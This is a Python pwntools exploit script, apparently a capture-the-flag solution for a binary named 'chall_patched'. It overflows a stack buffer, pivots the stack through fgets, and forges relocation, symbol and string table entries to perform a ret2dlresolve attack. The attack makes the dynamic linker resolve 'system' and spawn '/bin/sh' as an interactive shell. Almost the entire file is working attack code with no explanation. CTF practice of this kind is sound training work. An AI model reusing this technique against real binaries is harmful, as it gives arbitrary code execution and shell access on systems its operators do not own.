#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x40119A

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

buf = 0x404f90-0x128
fgets = 0x40119A
resolver = 0x401020

# align func
def align(addr):
    return int(0x18 - (addr) % 0x18)

# dynamic section
STRTAB = 0x3fe530
SYMTAB = 0x3fe440
JMPREL = 0x4005f0
info(f'STRTAB: {hex(STRTAB)}')
info(f'SYMTAB: {hex(SYMTAB)}')
info(f'JMPREL: {hex(JMPREL)}')

#gadgets
pop_rsi = 0x0000000000401165
rdi = 0x000000000040115a # mov rdi, rsi ; ret
leave = 0x0000000000401190

default_plt = 0x401020

# Fake .rela.plt
# fake rel
fake_rel = buf + 0x28
pad1=  align(fake_rel - JMPREL)
fake_rel += pad1 # Alignment in x64 is 0x18
info(f'fake rel: {hex(fake_rel)}')

check = (fake_rel  - JMPREL) / 0x18
print(check)
reloc_arg = int( check  )
info(f'reloc arg: {hex(reloc_arg)}')

# Fake .symtab
fake_symtab = buf+0x48-0x18
pad2 = align(fake_symtab - SYMTAB)
info(f'pad symtab: {pad2}')
fake_symtab += pad2 # Alignment in x64 is 0x18

r_info = (int((fake_symtab - SYMTAB) / 0x18)  << 32) | 0x7 # | 0x7 to bypass check 4.
info(f'r_info: {hex(r_info)}')
info(f'fake symtab: {hex(fake_symtab)}')

# Fake .strtab
fake_symstr = buf +0xa0
sh = buf +0x120
st_name = fake_symstr - STRTAB # offset between fake str and str_tab

info(f'sh: {hex(sh)}')
info(f'fake str: {hex(fake_symstr)}')

# on stack
load = flat(
    b'A'*0x60,
    buf+0x100, # rbp
    # exe.plt.read
    fgets
)

sl(load)

# write system string
load = flat(
    # pop_rsi,
    b'system\0\0',
)

load = load.ljust(0x60, b'\0')
load += flat(
    buf+0x180, # rbp
    fgets
)
sl(load)

# Write /bin/sh
load = flat(
    b'/bin/sh\0',
    b'A'*0x58,
    buf+0x60, # rbp
    # exe.plt.read
    fgets
)

sl(load)

# gadgets
load = p64(pop_rsi+1)

load += p64(pop_rsi)
load += p64(sh)
load += p64(rdi) # 0x18

# exploit
load += p64(default_plt)
load += p64(reloc_arg) # reloc_arg

# .rel
load += p64(exe.got.read)
load += p64(r_info)

# fake symtab
load += p32(st_name)
load += p8(0x12) # st_info 
load += p8(0)  # st_other -> 0x00, bypass check .5
load += p16(0) # st_shndx
load += p64(0) # st_value
load += p64(0) # st_size

# pad and leave
load = load.ljust(0x60, b'\0')
load += flat(
    buf - 0x8,
    leave,
)

sl(load)

p.interactive()
